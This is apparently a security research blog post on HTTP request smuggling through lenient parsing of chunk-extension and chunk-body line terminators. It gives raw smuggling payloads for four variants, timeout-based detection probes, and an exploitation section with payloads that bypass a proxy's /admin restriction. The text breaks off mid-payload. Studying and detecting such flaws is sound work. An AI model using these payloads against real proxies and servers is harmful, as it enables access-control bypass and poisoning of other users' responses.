---
title: "Funky chunks: abusing ambiguous chunk line terminators for request smuggling"
date: 2025-06-18
---

<style>
.http-line-break {
    background-color: rgba(165, 165, 165, 0.4);
    border-radius: 4px;
    margin: 0px;
    opacity: 0.65;
}

.http-highlight {
    display: block;
    padding: 0px 4px;
    border-radius: 8px;
    margin: 0px -4px;
}

.http-highlight-head {
    display: block;
    padding: 0px 4px;
    border-radius: 1px;
    border-top-left-radius: 8px;
    border-top-right-radius: 8px;
    margin: 0px -4px;
}

.http-highlight-one {
    background-color: #ffc6bf;
}

.http-highlight-two {
    background-color: #bfd3ff;
}

.http-highlight-three {
    background-color: #ffeabf;
}

.http-highlight-one-compl {
    background-color: #ffafa6;
}

.http-highlight-two-compl {
    background-color: #a6c2ff;
}

.http-highlight-three-compl {
    background-color: #ffe1a5;
}

.http-highlight-text {
    font-size: 12px;
    font-style: italic;
    color: #555;
    float: right;
    margin-right: 2px;
    margin-top: 2px;
}

.http-highlight-text-req {
    font-size: 12px;
    font-style: italic;
    color: #555;
    float: right;
    margin-right: 0px;
    margin-top: 0px;
}

.tooltip {
    position: relative;
    display: inline-block;
    cursor: pointer;
}

td {
  vertical-align: top;
  background-color: #fbfbfb;
}

.tooltip .tooltiptext {
    visibility: hidden;
    width: 140px;
    background-color: #f9f9f9;
    color: #333;
    text-align: center;
    border: 1px solid #ddd;
    border-radius: 5px;
    padding: 5px;
    position: absolute;
    z-index: 1;
    bottom: 105%;
    left: 50%;
    margin-left: -70px;
    box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
    opacity: 0;
    transition: opacity 0.2s ease-in-out;
}

.tooltip:hover .tooltiptext {
    visibility: visible;
    opacity: 1;
}
</style>

The HTTP/1.1 standard seems to be riddled with strange features that absolutely no one uses and no one even really knows about. Of course, HTTP implementers with an ambition of adhering to the specification need to support these protocol quirks anyway, and unfortunately, this often results in parsing logic that is lax or incomplete – after all, why bother enforcing strict syntax rules for protocol elements that aren't used for anything anyway?

In this post, we will explore how seemingly innocuous leniencies in the parsing of chunked message bodies, particularly in line terminators, can result in request smuggling vulnerabilities in widely-used servers and proxies. I will share new exploitation techniques and payloads, methods for black-box detection, and a few recent vulnerabilities found in well-known HTTP implementations.

### Chunk extensions: the HTTP feature nobody asked for
We begin our journey in a strange and largely forgotten corner of the HTTP/1.1 RFC specification, a section that feels unfamiliar even to those of us who spend our days staring at HTTP requests. As you may have guessed from the title, I am referring to [section 7.1.1](https://datatracker.ietf.org/doc/html/rfc9112#name-chunk-extensions) of [RFC 9112](https://datatracker.ietf.org/doc/html/rfc9112), birthplace of the *chunk extension*.

> __7.1.1. Chunk Extensions__  
>  
> The chunked coding allows each chunk to include zero or more chunk extensions, immediately following the chunk-size, for the sake of supplying per-chunk metadata (such as a signature or hash), mid-message control information, or randomization of message body size.  
>  
> <span style="display: block;">chunk-ext = *( BWS ";" BWS chunk-ext-name</span><span style="display: block; margin-left: 105px;">[ BWS "=" BWS chunk-ext-val ] )</span>  
> <span style="display: block;">chunk-ext-name = token</span><span style="display: block;">chunk-ext-val = token / quoted-string</span>

Chunk extensions are an optional feature for HTTP messages using [chunked transfer encoding](https://en.wikipedia.org/wiki/Chunked_transfer_encoding). Before we move on to discuss chunk extensions further, let us first briefly remind ourselves of the syntax of chunked-encoding HTTP messages.

Chunked transfer encoding is signaled by the `Transfer-Encoding: chunked` header. In such messages, the body is divided into *chunks*, each consisting of what we may refer to as a *chunk header* and a *chunk body*, both of which are terminated by a CRLF sequence. The chunk header consists of a hexadecimal number specifying the chunk size, optionally followed by any number of semicolon-separated chunk extensions. The chunk body contains the actual data being delivered, its length indicated by the header. The message ends when a zero-sized chunk is encountered.

<div style="margin: auto; width: 420px;">
<pre><code>POST /some/path HTTP/1.1<span class="http-line-break">\r\n</span>
Host: example.com<span class="http-line-break">\r\n</span>
Content-Type: text/plain<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">9<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk header</span>
</span>some data<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk body</span>
</span><span class="http-highlight http-highlight-two"><span class="http-highlight-head http-highlight-two-compl">e;foo=bar<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk header</span>
</span>some more data<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk body</span>
</span><span class="http-highlight http-highlight-three"><span class="http-highlight-head http-highlight-three-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-line-break">\r\n</span>
</span></code></pre>
</div>

Using these optional chunk extensions, a sender can attach metadata to each individual chunk they send. This is exemplified in the request above in which the metadata `foo=bar` is attached to the second chunk. To be clear, these chunk parameters are __not__ the data delivered to the web application – they're metainformation meant for the server processing the request.

So what are these chunk extensions actually used for? The answer is simple: *nothing*. No HTTP implementation makes any meaningful use of chunk extensions – servers ignore them and clients don't send them. It seems that the protocol designers have simply anticipated a need that would never turn out to exist. To put it bluntly: ***nobody cares about chunk extensions***.

Nothing makes this simple truth more apparent than reviewing the source code of a couple of HTTP implementations. A consistent behavior you'll find is that HTTP parsers simply consume the chunk extensions, discarding the contents. I believe a common sentiment among developers tasked with writing such parsing logic is quite nicely summarized in [this function](https://github.com/golang/go/blob/1d45a7ef560a76318ed59dfdb178cecd58caf948/src/net/http/internal/chunked.go#L193-L199) found in the net/http package of the Golang standard library.

```golang
func removeChunkExtension(p []byte) ([]byte, error) {
	p, _, _ = bytes.Cut(p, semi)
	// TODO: care about exact syntax of chunk extensions? We're
	// ignoring and stripping them anyway. For now just never
	// return an error.
	return p, nil
}
```

To an HTTP implementer, the chunk extension is indeed nothing more than a nuisance one has to account for in order to comply with the HTTP standard. However, the RFC is actually quite particular about what characters are allowed in chunk extensions and the syntax rules are not exactly straight-forward. As a result, __most HTTP implementations do not strictly adhere to the chunk extension specification__. And this makes sense – why would they, when they're just "ignoring and stripping them anyway", as one Golang developer put it so aptly?

#### A thought experiment
Parsers may choose to throw away chunk extensions, but they do still have to parse them. And as we've already established, parsers are inclined to do so somewhat carelessly, since the contents are discarded anyway. This is fertile ground for misinterpretations. Let us explore that further with a simple thought experiment.

Imagine that you're an HTTP parser, dutifully working your way through a chunk header. You encounter a semicolon, signaling the start of a chunk extension. Now, in your parsing of this chunk extension (which you intend to fully ignore), you come across a lone `\n` character. This is a bit unusual, and what you're really looking for is the CRLF terminator of the chunk header. What do you do? 

1. __Allow it__: You treat the `\n` like any other byte – you ignore it and continue searching for the CRLF sequence.
   
2. __Interpret it as a line terminator__: The client might not be fully compliant, but they obviously intended the `\n` to be a line terminator – you interpret the `\n` as the end of the chunk header and start parsing the body.
   
3. __Reject the request__: This request appears to be malformed – you respond with a client error.

Let's go through these options one by one. 

It's easy to see how a parser might come to choose option 1 without the author even realizing it. If it's only looking for the terminating CRLF sequence without any intention of caring about the chunk extension, it will plausibly just throw away the `\n` along with any other byte (legal or otherwise) that might exist between the `;` and `\r\n` sequences. Control characters like newlines are not allowed in chunk extensions, and of course allowing illegal characters is incorrect behavior, so this option is in violation of the RFC.

The second option – interpreting the newline as a line terminator – might at a glance appear valid. After all, [the RFC allows interpreting single LFs as line terminators in the request line and headers](https://datatracker.ietf.org/doc/html/rfc9112#section-2.2-3), so why not the chunk headers? Unfortunately, no such exception exists for the chunk lines; __only the complete CRLF is a valid line terminator in the chunked body__. You might not feel convinced that this is true, and I will grant you that it is a strange complication, especially since it's not even explicitly addressed in the specification. However, [this errata review from 2023](https://www.rfc-editor.org/errata/eid7633) confirms that the difference in allowed line terminators is in fact by design. As such, we conclude that option 2 is also in violation of the RFC.

Indeed, the only technically correct course of action is option 3: rejecting the request. 

### The vulnerability
Either of the two lenient parsing options are harmless behaviors on their own, but consider an environment with both a front-end reverse proxy (e.g. a load balancer, cache, or WAF) and a back-end web server. If the proxy in such an architecture applies one of the two incorrect interpretations while the server applies the other, we're left with a parsing discrepancy. This discrepancy can be exploited to construct ambiguous HTTP requests, enabling *HTTP request smuggling* attacks.

There are two variants of this type of request smuggling vulnerability. I will refer to these as TERM.EXT and EXT.TERM:
  1. __The terminator-extension (or TERM.EXT) variant__: The proxy interprets a certain sequence in a chunk extension as a line terminator, and the server treats it as part of the chunk extension.
  2. __The extension-terminator (or EXT.TERM) variant__: The server allows a certain sequence in a chunk extension that the proxy interprets as a line terminator.

While the newline character `\n` is perhaps the best example of a sequence that can cause a parsing discrepancy, it is worth noting that these techniques are not limited to `\n`; other potentially ambiguous sequences such as `\rX` and `\r` are equally exploitable, although much more uncommon.

An interesting thing to note is that these vulnerabilities fundamentally differ from conventional request smuggling vulnerabilities in that they do not rely on confusion between the `Content-Length` and `Transfer-Encoding` headers. This is good news for attackers, because while [the RFC forbids an intermediary from forwarding both these headers](https://datatracker.ietf.org/doc/html/rfc9112#section-6.3-2.3), chunk extensions can legally be forwarded. Many intermediaries do remove or normalize them, though.

#### TERM.EXT
Let us first take a look at a simple TERM.EXT request smuggling payload. Below, both interpretations are shown using highlights to display the perceived chunk boundaries.

<div style="display: flex; gap: 10px;">
<div style="flex: 1;">

<pre><code>GET /one HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">2;<span class="http-line-break">\n</span><span class="http-highlight-text">chunk header</span>
</span>xx<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk body</span>
</span><span class="http-highlight http-highlight-two"><span class="http-highlight-head http-highlight-two-compl">45<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk header</span>
</span>0<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk body</span>
<span class="http-line-break">\r\n</span>
GET /two HTTP/1.1<span class="http-line-break">\r\n</span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
</span><span class="http-highlight http-highlight-three"><span class="http-highlight-head http-highlight-three-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-line-break">\r\n</span>
</span></code></pre>

<p style="text-align: center; font-weight: bold;">TERM interpretation (proxy)</p>
</div>

<div style="flex: 1;">

<pre><code>GET /one HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">2;<span class="http-line-break">\n</span><span class="http-highlight-text">chunk header</span>
xx<span class="http-line-break">\r\n</span>
</span>45<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk body</span>
</span><span class="http-highlight http-highlight-two"><span class="http-highlight-head http-highlight-two-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-line-break">\r\n</span>
</span>GET /two HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #2</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-line-break">\r\n</span>
</span></code></pre>

<p style="text-align: center; font-weight: bold;">EXT interpretation (server)</p>
</div>
</div>

The key thing to notice in this request is of course the newline in the chunk extension which causes the parsing discrepancy. The proxy, interpreting the newline as a line terminator, will consider `45` the size of the second chunk, whereas the server will consider it the content of the first chunk. As such, a second pipelined request can be hidden in what the proxy perceives as the body of the second chunk.

*__Note__: The vulnerability I now presumptuously have coined 'TERM.EXT' was actually [documented](https://github.com/mattiasgrenfeldt/bachelors-thesis-http-request-smuggling) back in 2021 by Matthias Grenfeldt and Asta Olofsson. I've taken the liberty of naming it to reflect its place in the broader family of chunk parsing vulnerabilities.*


#### EXT.TERM
The EXT.TERM variant has to my knowledge never been documented before, although it follows quite naturally from the TERM.EXT technique. Let us have a look at a payload equivalent to the TERM.EXT payload above.

<div style="display: flex; gap: 10px;">
<div style="flex: 1;">

<pre><code>GET /one HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">45;<span class="http-line-break">\n</span><span class="http-highlight-text">chunk header</span>
AAAAAAAAAAAAA... <i>[69]</i><span class="http-line-break">\r\n</span>
</span>0<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk body</span>
<span class="http-line-break">\r\n</span>
GET /two HTTP/1.1<span class="http-line-break">\r\n</span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
</span><span class="http-highlight http-highlight-two"><span class="http-highlight-head http-highlight-two-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-line-break">\r\n</span>
</span></code></pre>

<p style="text-align: center; font-weight: bold;">EXT interpretation (proxy)</p>
</div>

<div style="flex: 1;">

<pre><code>GET /one HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">45;<span class="http-line-break">\n</span><span class="http-highlight-text">chunk header</span>
</span>AAAAAAAAAAAAA... <i>[69]</i><span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk body</span>
</span><span class="http-highlight http-highlight-two"><span class="http-highlight-head http-highlight-two-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-line-break">\r\n</span>
</span>GET /two HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #2</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-line-break">\r\n</span>
</span></code></pre>

<p style="text-align: center; font-weight: bold;">TERM interpretation (server)</p>
</div>
</div>

Much like in the TERM.EXT payload, the parsing discrepancy is introduced by the illegal `\n` in the chunk extension. The proxy ignores the sequence of 69 (0x45) A's in the perceived chunk extension, whereas the server considers it the content of the first chunk. The remaining data is therefore interpreted as the chunk body by the proxy, but as a pipelined request by the server.

### What about chunk bodies?
The attentive reader may have noticed that the TERM.EXT and EXT.TERM vulnerabilities are not so much inconsistencies in the parsing of *chunk extensions* as they are inconsistencies in the parsing of *line terminators*. The chunk extension itself is nothing more than a convenient place to hide a sequence of padding bytes (like `'xx'` or `'AAAAA...'`). In this light, it is only natural to ask: are line terminator parsing discrepancies in the chunk *body* not exploitable as well?

At first glance, the obvious answer appears to be *no*, precisely because there is no equivalent to the chunk extension in the chunk body. However, I have found that given the presence of one additional fairly common parsing leniency, we can extend the TERM.EXT and EXT.TERM techniques to exploit similar flaws in the line terminator parsing of the chunk body.

The trick is to use *oversized chunks* – that is, chunks with larger bodies than indicated in the chunk header. For example, consider the invalid chunked message body below:

<pre><code>5<span class="http-line-break">\r\n</span>
AAAAA<span class="http-highlight-one-compl" style="padding: 0 0px;">XXX</span><span class="http-line-break">\r\n</span>
0<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
</code></pre>

Some HTTP servers and proxies accept such malformed chunks and simply ignore the trailing excess bytes which I will henceforth refer to as the *spill*. By placing a sequence that one parser interprets as a line terminator in what another parser interprets as a spill, we obtain an exploitable parsing discrepancy. This allows us to define a new set of complementary vulnerabilities that to my knowledge has never before been documented.

#### TERM.SPILL
Let us first consider the scenario in which the server accepts oversized chunk bodies. To exploit this leniency, we must then find a sequence that only the proxy recognizes as a line terminator. 

In my experience, parsers are even more lenient regarding the CRLF after the chunk body. Since only the sequence `\r\n` is valid in this location, some parsers do not even bother to check it and just accept any 2-byte sequence. Here's an example payload effective against a proxy using such a parser.

<div style="display: flex; gap: 10px;">
<div style="flex: 1;">

<pre><code>GET /one HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">5<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk header</span>
</span>AAAAAXX<span class="http-highlight-text">chunk body</span>
</span><span class="http-highlight http-highlight-two"><span class="http-highlight-head http-highlight-two-compl">45<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk header</span>
</span>0<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk body</span>
<span class="http-line-break">\r\n</span>
GET /two HTTP/1.1<span class="http-line-break">\r\n</span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
</span><span class="http-highlight http-highlight-three"><span class="http-highlight-head http-highlight-three-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-line-break">\r\n</span>
</span></code></pre>

<p style="text-align: center; font-weight: bold;">TERM interpretation (proxy)</p>
</div>

<div style="flex: 1;">

<pre><code>GET /one HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">5<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk header</span>
</span>AAAAAXX<span class="http-highlight-text">chunk body</span>
45<span class="http-line-break">\r\n</span>
</span><span class="http-highlight http-highlight-two"><span class="http-highlight-head http-highlight-two-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-line-break">\r\n</span>
</span>GET /two HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #2</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-line-break">\r\n</span>
</span></code></pre>

<p style="text-align: center; font-weight: bold;">SPILL interpretation (server)</p>
</div>
</div>

On the front-end, the `XX` sequence is interpreted as a CRLF, and the subsequent `45` sequence is interpreted as the size of the next chunk. On the back-end, the entire `XX45` sequence is interpreted as spill bytes and thus ignored. Therefore, a second pipelined request can be hidden in what the proxy perceives as the body of the second chunk. 


#### SPILL.TERM
In the opposite scenario, the proxy ignores spills in chunk bodies and we must find a sequence to place in a spill that only the server interprets as a line terminator. Let us this time suppose that a `\rX` sequence is ignored on the front-end but interpreted as a line terminator on the back-end.

<div style="display: flex; gap: 10px;">
<div style="flex: 1;">

<pre><code>GET /one HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">5<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk header</span>
</span>AAAAA<span class="http-line-break">\r</span>X<span class="http-highlight-text">chunk body</span>
2<span class="http-line-break">\r\n</span>
</span><span class="http-highlight http-highlight-two"><span class="http-highlight-head http-highlight-two-compl">45<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk header</span>
</span>0<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk body</span>
<span class="http-line-break">\r\n</span>
GET /two HTTP/1.1<span class="http-line-break">\r\n</span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
</span><span class="http-highlight http-highlight-three"><span class="http-highlight-head http-highlight-three-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-line-break">\r\n</span>
</span></code></pre>

<p style="text-align: center; font-weight: bold;">SPILL interpretation (proxy)</p>
</div>

<div style="flex: 1;">

<pre><code>GET /one HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">5<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk header</span>
</span>AAAAA<span class="http-line-break">\r</span>X<span class="http-highlight-text">chunk body</span>
</span><span class="http-highlight http-highlight-two"><span class="http-highlight-head http-highlight-two-compl">2<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk header</span>
</span>45<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk body</span>
</span><span class="http-highlight http-highlight-three"><span class="http-highlight-head http-highlight-three-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-line-break">\r\n</span>
</span>GET /two HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #2</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-line-break">\r\n</span>
</span></code></pre>

<p style="text-align: center; font-weight: bold;">TERM interpretation (server)</p>
</div>
</div>

Here, the `\rX2` spill is ignored by the proxy, but interpreted as a CRLF followed by a chunk size of `2` on the back-end. Consequently, the `45` sequence is interpreted as a chunk size by the proxy, but as data by the back-end server, once again allowing a second request to be hidden from the proxy.


### A short note on normalization
Normalization is the natural-born enemy of all four kinds of request smuggling we've discussed in the previous sections. Indeed, if the proxy strips chunk extensions and 'spills', replaces all line terminators with `\r\n`, or just rewrites the entire request with a `Content-Length` header, then it doesn't really matter what parsing leniencies either the proxy or server has; it's just not possible to cause a parsing discrepancy.

It is tempting to conclude from the above that a proxy that normalizes the chunked body before forwarding the request is immune to these sorts of attacks. One might even go as far as to claim that such a proxy *should* parse leniently in the name of robustness, as is decreed by [Postel's Law](https://en.wikipedia.org/wiki/Robustness_principle):

> be conservative in what you send, be liberal in what you accept

The trouble with this assumption is that a proxy does not know in advance whether any additional proxies will be placed in front of it. It is not uncommon to chain proxies with different purposes in modern architectures. In such environments, a chunk-normalizing proxy with one of the parsing flaws we've discussed could still be exploitable for request smuggling if another proxy further up the chain is affected by the complementary parsing flaw.

### Black-box detection
Vulnerable combinations of servers and proxies can quite easily be identified by analyzing source code, but rarely do we in practice have the luxury of access to such details of our target's systems. To discover these vulnerabilities in the wild, we need generic probes.

In order to design such probes, we can adapt the [timeout-based detection methods](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn#detect) developed by James Kettle in his 2019 request smuggling [research](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn). The key idea here is to construct an HTTP request that will (1) cause a vulnerable front-end to drop the last portion of the request body and (2) cause a vulnerable back-end to hang if (and only if) some of the body doesn't arrive. This concept can quite easily be adapted to our little family of chunk parsing vulnerabilities.

<div style="display: flex; gap: 10px;">
<div style="flex: 1;">
<pre><code>POST / HTTP/1.1<span class="http-line-break">\r\n</span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
2;<span class="http-line-break">\n</span>
xx<span class="http-line-break">\r\n</span>
10<span class="http-line-break">\r\n</span>
1f<span class="http-line-break">\r\n</span>
AAAABBBBCCCC<span class="http-line-break">\r\n</span>
0<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one">DDDDEEEEFFFF<span class="http-line-break">\r\n</span><span class="http-highlight-text">dropped by front-end</span>
0<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
</span></code></pre>
<p style="text-align: center; font-weight: bold;">TERM.EXT probe</p>
</div>

<div style="flex: 1;">
<pre><code>POST / HTTP/1.1<span class="http-line-break">\r\n</span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
2;<span class="http-line-break">\n</span>
xx<span class="http-line-break">\r\n</span>
22<span class="http-line-break">\r\n</span>
c<span class="http-line-break">\r\n</span>
AAAABBBBCCCC<span class="http-line-break">\r\n</span>
0<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one">DDDDEEEEFFFF<span class="http-line-break">\r\n</span><span class="http-highlight-text">dropped by front-end</span>
0<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
</span></code></pre>
<p style="text-align: center; font-weight: bold;">EXT.TERM probe</p>
</div>
</div>

In each of the example probes above, a proxy with the corresponding parsing flaw will interpret the first `0\r\n\r\n` sequence as the terminating zero-sized chunk, causing it to drop the part of the request marked in red. A vulnerable server receiving the request without the last part will expect more data to arrive, causing it to hang and eventually time out. This results in an easily identifiable time delay. 

I've written a scanner script I call [smugchunks](https://github.com/JeppW/smugchunks) for automating these vulnerability discovery techniques. For those interested, its source code is publicly available on GitHub and includes payloads for TERM.SPILL and SPILL.TERM detection as well.

### Exploitation
Exploiting chunk parser differentials is really not much different from exploiting any other kind of request smuggling vulnerability; they can used for the same attacks you know and love, such as circumventing front-end security controls and serving malicious responses to unsuspecting live clients. 

In the interest of empowering readers to apply these techniques in practice, I've included a brief discussion on exploitation with some examples here. If you're already well-versed in request smuggling, you will probably find nothing new in this section – feel free to skip ahead.

#### Bypassing front-end rules
As a smuggled request (by its very definition) is not interpreted as a request by the front-end proxy, it will not be subjected to any access control rules the front-end may enforce, nor will the front-end rewrite the headers of the request as it would normally. Depending on the nature and purpose of the proxy in question, bypassing these front-end operations can be hugely impactful.

Consider, for example, a front-end that restricts access to `/admin`. By exploiting a TERM.EXT vulnerability, we can circumvent this access control rule using a payload like the one below.

<pre><code>GET / HTTP/1.1<span class="http-line-break">\r\n</span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
2;<span class="http-line-break">\n</span>
xx<span class="http-line-break">\r\n</span>
47<span class="http-line-break">\r\n</span>
0<span class="http-line-break">\r\n</span> 
<span class="http-line-break">\r\n</span>
GET /admin HTTP/1.1<span class="http-line-break">\r\n</span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
0<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span> 
</code></pre>

This simple payload, however, suffers from a major limitation. While the smuggled request *will* reach the back-end server, its response will not be returned to us. This is because the proxy believes it received only a single request, so it will usually not reply with two responses. 

Fortunately, we can quite easily overcome this apparent blindness with a minor modification to the payload. We simply replace the `Transfer-Encoding` header with an oversized `Content-Length` header in the smuggled request and append a second pipelined request. When we make this change, we must also remember to update the chunk size accordingly.


<div style="display: flex; gap: 10px;">
<div style="flex: 1;">
<pre><code><span class="http-highlight http-highlight-one">GET / HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
2;<span class="http-line-break">\n</span>
xx<span class="http-line-break">\r\n</span>
3f<span class="http-line-break">\r\n</span>
0<span class="http-line-break">\r\n</span> 
<span class="http-line-break">\r\n</span>
GET /admin HTTP/1.1<span class="http-line-break">\r\n</span>
Host: localhost<span class="http-line-break">\r\n</span>
Content-Length: 40<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
0<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span></span><span class="http-highlight http-highlight-two">GET / HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #2</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span></span></code></pre>
<p style="text-align: center; font-weight: bold;">Proxy interpretation</p>
</div>

<div style="flex: 1;">
<pre><code><span class="http-highlight http-highlight-one">GET / HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
2;<span class="http-line-break">\n</span>
